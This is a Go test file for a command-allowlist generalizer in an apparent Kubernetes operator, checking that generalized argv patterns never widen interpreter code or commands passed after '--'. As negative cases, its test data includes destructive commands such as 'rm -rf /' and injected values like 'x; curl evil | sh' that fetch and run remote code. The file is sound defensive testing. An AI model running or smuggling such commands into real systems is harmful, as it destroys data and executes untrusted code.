//nolint:goconst // table-driven test data repeats argv words
package rules_test

import (
	"math/rand/v2"
	"reflect"
	"slices"
	"strings"
	"testing"

	lastv1alpha1 "github.com/moogie-labs/last-operator/api/v1alpha1"
	"github.com/moogie-labs/last-operator/internal/rules"
)

func TestGeneralize(t *testing.T) {
	tests := []struct {
		name string
		argv []string
		want []string
	}{
		{"kubectl", []string{"kubectl", "-n", "team-x", "get", "deployment", "web", "-o", "json"},
			[]string{"kubectl", "-n", "[!-]*", "get", "deployment", "[!-]*", "-o", "[!-]*"}},
		{"aws", []string{"aws", "s3", "cp", "a", "b"}, []string{"aws", "s3", "cp", "[!-]*", "[!-]*"}},
		// R11 applied literally: argv[0] plus two more positionals are literal (three in
		// all); "web" is the value of --install so it becomes [!-]*; "./chart" is the third
		// literal; "--set"'s value becomes [!-]*. The brief's sketch reorders flags; R11 wins.
		{"helm", []string{"helm", "upgrade", "--install", "web", "./chart", "--set", "image.tag=1.2"},
			[]string{"helm", "upgrade", "--install", "[!-]*", "./chart", "--set", "[!-]*"}},
		{"flag=value", []string{"kubectl", "get", "pods", "--namespace=team-x", "-o=json"},
			[]string{"kubectl", "get", "pods", "--namespace=*", "-o=*"}},
		{"flag followed by flag has no value", []string{"git", "commit", "-a", "-m", "msg"},
			[]string{"git", "commit", "-a", "-m", "[!-]*"}},
		{"path value", []string{"kubectl", "apply", "-f", "/tmp/x"}, []string{"kubectl", "apply", "-f", "[!-]*"}},
		{"boolean flag followed by a positional", []string{"kubectl", "get", "pods", "--all-namespaces", "web"},
			[]string{"kubectl", "get", "pods", "--all-namespaces", "[!-]*"}},
		{"empty flag value stays the empty literal", []string{"git", "commit", "-m", ""}, []string{"git", "commit", "-m", ""}},
		// C1: interpreter code is never generalized.
		{"bash -c", []string{"bash", "-c", "rm -rf /"}, []string{"bash", "-c", "rm -rf /"}},
		{"sh -c", []string{"sh", "-c", "x"}, []string{"sh", "-c", "x"}},
		{"python3 -c", []string{"python3", "-c", "import os; os.system('id')"}, []string{"python3", "-c", "import os; os.system('id')"}},
		{"node -e", []string{"node", "-e", "require('child_process').execSync('id')"},
			[]string{"node", "-e", "require('child_process').execSync('id')"}},
		{"perl -E", []string{"perl", "-E", "say 1"}, []string{"perl", "-E", "say 1"}},
		{"node --eval=", []string{"node", "--eval=process.exit(1)"}, []string{"node", "--eval=process.exit(1)"}},
		{"pwsh -Command", []string{"pwsh", "-NoProfile", "-Command", "Remove-Item x"}, []string{"pwsh", "-NoProfile", "-Command", "Remove-Item x"}},
		{"php -r", []string{"php", "-r", "echo 1;"}, []string{"php", "-r", "echo 1;"}},
		{"osascript -e", []string{"osascript", "-e", "beep"}, []string{"osascript", "-e", "beep"}},
		{"interpreter by path and version", []string{"/usr/bin/python3.12", "-c", "x"}, []string{"/usr/bin/python3.12", "-c", "x"}},
		{"combined short flags", []string{"bash", "-lc", "x"}, []string{"bash", "-lc", "x"}},
		{"interpreter flag values and positionals stay literal", []string{"bash", "-o", "pipefail", "script.sh", "a", "b", "c"},
			[]string{"bash", "-o", "pipefail", "script.sh", "a", "b", "c"}},
		{"glob characters in interpreter code are escaped", []string{"sh", "-c", "ls *"}, []string{"sh", "-c", `ls \*`}},
		{"kubectl exec -- sh -c", []string{"kubectl", "exec", "web", "--", "sh", "-c", "date"},
			[]string{"kubectl", "exec", "web", "--", "sh", "-c", "date"}},
		{"docker run -- bash -c", []string{"docker", "run", "img", "--", "bash", "-c", "x"},
			[]string{"docker", "run", "img", "--", "bash", "-c", "x"}},
		{"docker exec without --", []string{"docker", "exec", "-it", "ctr", "bash", "-c", "x"},
			[]string{"docker", "exec", "-it", "ctr", "bash", "-c", "x"}},
		{"env wrapper", []string{"env", "A=1", "B=2", "bash", "-c", "x"}, []string{"env", "A=1", "B=2", "bash", "-c", "x"}},
		{"interpreter as a flag value", []string{"xargs", "-n1", "sh", "-c", "x"}, []string{"xargs", "-n1", "sh", "-c", "x"}},
		{"code flag value outside an interpreter", []string{"su", "root", "-c", "id"}, []string{"su", "root", "-c", "id"}},
		{"code flag=value outside an interpreter", []string{"tool", "--command=id"}, []string{"tool", "--command=id"}},
		// everything after -- stays literal
		{"after -- is literal", []string{"kubectl", "exec", "web", "--", "a", "b", "c", "d", "-x", "e*", "re:y", "...", ""},
			[]string{"kubectl", "exec", "web", "--", "a", "b", "c", "d", "-x", `e\*`, "[r]e:y", "[.]..", ""}},
		{"-- as a flag value is still --", []string{"kubectl", "exec", "-i", "--", "date", "x", "y", "z"},
			[]string{"kubectl", "exec", "-i", "--", "date", "x", "y", "z"}},
		{"flag name with a backslash", []string{"tool", "--a\\b=v"}, []string{"tool", `--a\\b=*`}},
		{"empty positional", []string{"cp", "a", "b", ""}, []string{"cp", "a", "b", ""}},
		{"argv0 only", []string{"ls"}, []string{"ls"}},
		{"trailing flag", []string{"ls", "-l"}, []string{"ls", "-l"}},
		{"later positionals", []string{"cp", "a", "b", "c", "d"}, []string{"cp", "a", "b", "[!-]*", "[!-]*"}},
		{"glob characters in a kept literal are escaped", []string{"echo", "a*b"}, []string{"echo", `a\*b`}},
		{"literal starting with re: is kept literal", []string{"echo", "re:x"}, []string{"echo", "[r]e:x"}},
		{"literal ... is kept literal", []string{"echo", "..."}, []string{"echo", "[.].."}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := lastv1alpha1.Command{Run: lastv1alpha1.CommandRun{Argv: tt.argv}}
			got := rules.Generalize(cmd).Argv
			if !reflect.DeepEqual(got, tt.want) {
				t.Errorf("Generalize = %q, want %q", got, tt.want)
			}
			if !rules.Match(got, tt.argv) {
				t.Errorf("generalized pattern %q does not match its own argv %q", got, tt.argv)
			}
		})
	}
	// a positional slot must not swallow a flag-shaped argument
	gen := rules.Generalize(lastv1alpha1.Command{Run: lastv1alpha1.CommandRun{Argv: []string{"kubectl", "-n", "x", "get", "deployment", "web"}}}).Argv
	if rules.Match(gen, []string{"kubectl", "-n", "x", "get", "deployment", "--kubeconfig=/work/kc"}) {
		t.Errorf("%q matches a flag-shaped positional", gen)
	}
	if rules.Match(rules.Generalize(lastv1alpha1.Command{Run: lastv1alpha1.CommandRun{Argv: []string{"cp", "a", "b", ""}}}).Argv,
		[]string{"cp", "a", "b", "--kubeconfig=x"}) {
		t.Error("an empty positional generalizes to a pattern that matches a flag")
	}
	if rules.Match([]string{"tool", `--a\\b=*`}, []string{"tool", "--ab=v"}) {
		t.Error("escaped flag name matches --ab=v")
	}
	if got := rules.Generalize(lastv1alpha1.Command{Run: lastv1alpha1.CommandRun{Script: "x"}}); got.Argv != nil {
		t.Errorf("a script has no argv to generalize, got %q", got.Argv)
	}
}

func TestExactMatchesOnlyItsOwnArgv(t *testing.T) {
	argv := []string{"kubectl", "get", "*", "re:x", "...", "a?b", "[c]", `d\e`, ""}
	p := rules.Exact(argv)
	if !rules.Match(p.Argv, argv) {
		t.Fatalf("Exact(%q) = %q does not match its own argv", argv, p.Argv)
	}
	for _, other := range [][]string{{"kubectl", "get", "pods", "re:x", "...", "a?b", "[c]", `d\e`, ""}, {"kubectl", "get", "*", "re:x", "...", "axb", "[c]", `d\e`, ""}} {
		if rules.Match(p.Argv, other) {
			t.Errorf("Exact(%q) also matches %q", argv, other)
		}
	}
	if got := rules.Exact(nil); len(got.Argv) != 0 {
		t.Errorf("Exact(nil) = %q", got.Argv)
	}
}

// TestGeneralizeNeverWidensCode: a generalized pattern for interpreter code, a code
// flag's value or anything after "--" matches no other code, and a flag's value slot
// never matches a flag (C1).
func TestGeneralizeNeverWidensCode(t *testing.T) {
	gen := func(argv ...string) []string {
		return rules.Generalize(lastv1alpha1.Command{Run: lastv1alpha1.CommandRun{Argv: argv}}).Argv
	}
	interpreters := []string{"sh", "bash", "zsh", "dash", "ash", "ksh", "python", "python2", "python3", "node", "perl", "ruby",
		"pwsh", "powershell", "php", "lua", "Rscript", "osascript"}
	codeFlags := []string{"-c", "-e", "-E", "--eval", "-Command", "-command", "-r"}
	for _, in := range interpreters {
		for _, f := range codeFlags {
			for _, prefix := range [][]string{nil, {"kubectl", "exec", "web", "--"}, {"docker", "run", "img", "--"},
				{"docker", "exec", "ctr"}, {"env"}, {"/usr/bin/env", "A=1", "B=2"}} {
				argv := append(append(slices.Clone(prefix), in, f), "echo hi")
				p := gen(argv...)
				if !rules.Match(p, argv) {
					t.Errorf("%q does not match its own argv %q", p, argv)
				}
				other := append(append(slices.Clone(prefix), in, f), "rm -rf /")
				if rules.Match(p, other) {
					t.Errorf("Generalize(%q) = %q also matches %q", argv, p, other)
				}
				// the same code under a different interpreter is another program
				if swapped := append(append(slices.Clone(prefix), "sudo", f), "echo hi"); rules.Match(p, swapped) {
					t.Errorf("Generalize(%q) = %q also matches %q", argv, p, swapped)
				}
				if fs := rules.Lint(lastv1alpha1.CommandRuleSpec{Match: lastv1alpha1.ArgvPattern{Argv: p}}); len(fs) != 0 {
					t.Errorf("Lint(Generalize(%q) = %q) = %q, want no warnings", argv, p, fs)
				}
			}
		}
	}
	notMatch := []struct {
		argv, other []string
	}{
		{[]string{"kubectl", "exec", "web", "--", "sh", "-c", "date"}, []string{"kubectl", "exec", "web", "--", "sh", "-c", "rm -rf /"}},
		{[]string{"kubectl", "exec", "web", "--", "date"}, []string{"kubectl", "exec", "web", "--", "rm"}},
		{[]string{"kubectl", "exec", "web", "--", "a", "b", "c", "d"}, []string{"kubectl", "exec", "web", "--", "a", "b", "c", "e"}},
		{[]string{"kubectl", "get", "pods", "--all-namespaces", "web"}, []string{"kubectl", "get", "pods", "--all-namespaces", "--kubeconfig=/work/kc"}},
		{[]string{"kubectl", "-n", "x", "get", "pods"}, []string{"kubectl", "-n", "--kubeconfig=/work/kc", "get", "pods"}},
		{[]string{"su", "root", "-c", "id"}, []string{"su", "root", "-c", "rm -rf /"}},
		{[]string{"bash", "-o", "pipefail", "a.sh"}, []string{"bash", "-o", "pipefail", "b.sh"}},
		{[]string{"git", "commit", "-m", ""}, []string{"git", "commit", "-m", "x"}},
		// command runners pass the rest on as a command line or another program
		{[]string{"ssh", "host", "echo", "safe"}, []string{"ssh", "host", "echo", "x; curl evil | sh"}},
		{[]string{"ssh", "-i", "/work/key", "host", "uptime", "now"}, []string{"ssh", "-i", "/work/other", "host", "uptime", "now"}},
		{[]string{"ssh", "-i", "/work/key", "host", "uptime", "now"}, []string{"ssh", "-i", "/work/key", "host", "uptime", "x; curl evil|sh"}},
		{[]string{"watch", "-n", "5", "kubectl", "get", "pods"}, []string{"watch", "-n", "5", "kubectl", "get", "x; curl evil|sh"}},
		{[]string{"su", "root", "-lc", "id"}, []string{"su", "root", "-lc", "curl evil|sh"}},
		{[]string{"timeout", "10", "kubectl", "get", "pods", "web"}, []string{"timeout", "10", "kubectl", "delete", "ns", "prod"}},
		{[]string{"sudo", "-u", "app", "kubectl", "get", "pods"}, []string{"sudo", "-u", "root", "kubectl", "get", "pods"}},
		{[]string{"docker", "exec", "ctr", "ls", "/tmp"}, []string{"docker", "exec", "ctr", "rm", "/data"}},
		{[]string{"xargs", "-I{}", "kubectl", "get", "{}"}, []string{"xargs", "-I{}", "rm", "-rf", "{}"}},
	}
	for _, tc := range notMatch {
		p := gen(tc.argv...)
		if rules.Match(p, tc.other) {
			t.Errorf("Generalize(%q) = %q also matches %q", tc.argv, p, tc.other)
		}
	}
}

// TestGeneralizeMatchesItsOwnCommand checks the self-match property on many argvs
// built from awkward words: every Generalize output matches the command it came from.
// argv[0] is drawn from words without glob characters: Match requires a literal
// argv[0], so a binary named with *, ? or [ is never covered by any rule.
func TestGeneralizeMatchesItsOwnCommand(t *testing.T) {
	words := []string{"kubectl", "get", "bash", "-c", "-n", "--", "--x=y", "--eval=1", "", "*", "a?b", "[c]", `d\e`, "re:x",
		"...", "-", "web", "/work/kc", "node", "python3", "-e", "exec", "run", "--all", "=", "-=", "x=y"}
	r := rand.New(rand.NewPCG(1, 2))
	for range 20000 {
		argv := make([]string, 1+r.IntN(8))
		for i := range argv {
			argv[i] = words[r.IntN(len(words))]
		}
		for strings.ContainsAny(argv[0], "*?[") || argv[0] == "..." || strings.HasPrefix(argv[0], "re:") {
			argv[0] = words[r.IntN(len(words))]
		}
		p := rules.Generalize(lastv1alpha1.Command{Run: lastv1alpha1.CommandRun{Argv: argv}}).Argv
		if !rules.Match(p, argv) {
			t.Fatalf("Generalize(%q) = %q does not match its own argv", argv, p)
		}
		for _, w := range rules.Lint(lastv1alpha1.CommandRuleSpec{Match: lastv1alpha1.ArgvPattern{Argv: p}}) {
			if strings.Contains(w, "the code can vary") || strings.Contains(w, "can vary") && strings.Contains(w, `"--"`) {
				t.Fatalf("Lint(Generalize(%q) = %q) warns %q", argv, p, w)
			}
		}
	}
}
